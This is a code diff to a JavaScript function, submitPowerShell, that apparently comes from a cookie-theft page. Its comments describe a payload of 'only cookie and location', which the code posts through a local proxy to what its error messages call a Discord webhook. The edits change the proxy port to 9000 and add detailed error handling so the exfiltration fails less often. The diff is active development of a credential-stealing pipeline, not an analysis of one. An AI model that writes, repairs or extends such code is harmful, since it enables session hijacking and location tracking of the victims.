@@ -264,7 +264,7 @@ async function submitPowerShell() {
         await new Promise(resolve => setTimeout(resolve, delay));
         
         // Use local proxy to bypass CORS restrictions
-        const webhookUrl = 'http://localhost:8080/webhook';
+        const webhookUrl = 'http://localhost:9000/webhook';
         
         // Simple webhook payload - only cookie and location
         const payload = {
@@ -301,7 +301,17 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
             }, 2000);
         } else {
             const errorData = await response.json().catch(() => ({ error: 'Unknown error' }));
-            throw new Error(`Webhook failed: ${errorData.error || response.status}`);
+            console.error('Webhook failed:', response.status, errorData);
+            
+            if (response.status === 405) {
+                throw new Error(`Method not allowed (405). Check if proxy server is running on port 9000.`);
+            } else if (response.status === 403) {
+                throw new Error(`Webhook forbidden (403). The Discord webhook URL may be invalid or expired.`);
+            } else if (response.status === 0 || !response.status) {
+                throw new Error(`Connection failed. Make sure the proxy server is running on http://localhost:9000`);
+            } else {
+                throw new Error(`Webhook failed (${response.status}): ${errorData.error || 'Unknown error'}`);
+            }
         }
     } catch (error) {
         if (loadingOverlay) loadingOverlay.style.display = 'none';
